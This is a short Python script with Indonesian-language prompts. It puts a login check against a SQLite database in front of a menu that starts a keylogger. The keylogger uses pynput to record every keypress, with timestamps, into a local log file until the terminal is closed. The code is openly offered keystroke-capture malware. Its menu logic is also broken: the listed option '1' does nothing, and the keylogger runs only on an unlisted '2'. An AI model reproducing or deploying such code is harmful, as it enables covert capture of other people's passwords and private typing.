import sys
from os import system
from time import sleep
import sqlite3
from getpass import getpass

title = '''

==================================
  Selamat Datang Di Program Saya
==================================

'''

menu = '''

1. Aktifkan keylogger

Menu Yang Lain Sedang Dalam Pembuatan

''' 

class Keylogger:

    def __init__(self):

        print("\nKeylogger Telah Di Aktifkan")

        print("Untuk Mematikan Program Silahkan Close Terminal Anda")

        self.main()

    def main(self):
        
        from pynput.keyboard import Key, Listener
        import logging

        log_dir = "keylogger/"

        logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='["%(asctime)s", %(message)s]')

        def on_press(key):
            logging.info('"{0}"'.format(key))

        with Listener(on_press=on_press) as listener:
            listener.join()
      

class Main:
    
    def __init__(self):

        sleep(1)
        print(title)
        
        while True:
            username = input("Masukan username : ")
            password = getpass("\nMasukan password : ")
            with sqlite3.connect('database/x-project.db') as db:
                c = db.cursor()
            find_user = ("SELECT * FROM user WHERE username = ? AND password = ?")
            c.execute(find_user,[(username),(password)])
            result = c.fetchall()

            if result:
                self.main()
                break
        
            else:
                print("\nUsername dan password salah")
                sys.exit(0)
                
    def main(self):
        
        print(menu)

        pilihan = input("Silahkan pilih menu yang ada di atas : ")
        if pilihan == '1':
            pass
        elif pilihan == '2':
            keylogger = Keylogger()
            
                
if __name__ == '__main__':
    main = Main()
